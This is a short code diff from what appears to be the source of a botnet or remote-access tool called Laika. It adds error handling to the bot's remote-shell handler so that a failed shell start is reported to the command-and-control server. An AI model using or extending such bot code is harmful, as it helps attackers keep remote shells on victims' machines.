@@ -20,8 +20,9 @@ void laikaB_handleShellOpen(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     laikaS_readInt(&peer->sock, &cols, sizeof(uint16_t));
     laikaS_readInt(&peer->sock, &rows, sizeof(uint16_t));
 
-    /* open shell */
-    bot->shell = laikaB_newShell(bot, cols, rows);
+    /* open shell & if we failed, tell cnc */
+    if ((bot->shell = laikaB_newShell(bot, cols, rows)) == NULL)
+        laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_CLOSE);
 }
 
 void laikaB_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
